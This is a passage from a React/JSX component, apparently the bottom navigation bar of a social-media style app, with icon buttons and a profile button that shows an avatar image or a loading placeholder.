      <nav className="sticky bottom-0 flex items-center justify-around px-6 py-3 bg-white border-t border-gray-200">
        <button className="text-gray-900">
          <Home className="h-6 w-6 fill-gray-900" />
        </button>
        <button className="text-gray-500">
          <Search className="h-6 w-6" />
        </button>
        <button className="text-gray-500">
          <PlusSquare className="h-6 w-6" />
        </button>
        <button className="text-gray-500">
          <Compass className="h-6 w-6" />
        </button>
        <button type="button" className="text-gray-500" aria-label={t("profileAria")}>
          <div className="w-6 h-6 rounded-full bg-gray-200 overflow-hidden relative">
            {linkImage && !postImageBroken ? (
              <Image
                src={linkImage}
                alt=""
                width={24}
                height={24}
                unoptimized
                className="w-full h-full object-cover"
              />
            ) : (
              <div className="w-full h-full bg-gray-300 animate-pulse" />
            )}
          </div>
        </button>
      </nav>

    </div>
  );
}
